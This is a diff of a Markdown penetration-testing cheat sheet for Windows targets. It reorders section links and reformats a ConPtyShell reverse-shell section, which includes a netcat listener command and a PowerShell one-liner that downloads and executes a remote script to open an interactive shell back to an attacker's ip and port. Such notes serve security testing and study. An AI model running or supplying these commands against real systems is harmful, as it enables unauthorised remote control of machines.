@@ -4,20 +4,19 @@
 </picture>
 
 ---
-- [Enumeration](#enumeration)
+- [DMP File](#dmp-file)
 - [Enum4Linux](#enum4linux)
-- [SMB](#smb)
-- [MSRPC](#msrpc)
-- [WinRM](#winrm)
+- [Enumeration](#enumeration)
+- [Exfiltration](#exfiltration)
+- [IMPACKET](#impacket)
 - [Kerberos](#kerberos)
 - [Ldap](#ldap)
-- [IMPACKET](#impacket)
+- [MSRPC](#msrpc)
 - [Responder](#responder)
-- [Exfiltration](#exfiltration)
-- [DMP File](#dmp-file)
-- [Virus](#virus)
 - [Reverse shell](#reverse-shell)
-- [Useful links](#useful-links)
+- [SMB](#smb)
+- [Virus](#virus)
+- [WinRM](#winrm)
 
 # Enumeration
 ## Scripts
@@ -275,17 +274,15 @@ bulk_extractor -o bulk_output memory.dmp
 ### ConPtyShell
 > ConPtyShell is a Fully Interactive Reverse Shell for Windows systems. *[source](https://github.com/antonioCoco/ConPtyShell)*
 
-Server :
+#### Server :
 ```bash
 stty raw -echo; (stty size; cat) | nc -lvnp port
 ```
-Client with internet access: 
-```bash
+
+#### Client with internet access: 
+```powershell
 IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell ip port
 ```
-without : create shell.ps1, paste the Invoke-ConPtyShell.ps1, add '**Invoke-ConPtyShell ip port**' on a new line
+*without create shell.ps1, paste the Invoke-ConPtyShell.ps1, add `Invoke-ConPtyShell ip port` on a new line*
 
-# Useful links
 Interactive Windows cheatsheet : [Wadcoms](https://wadcoms.github.io/)
-
-
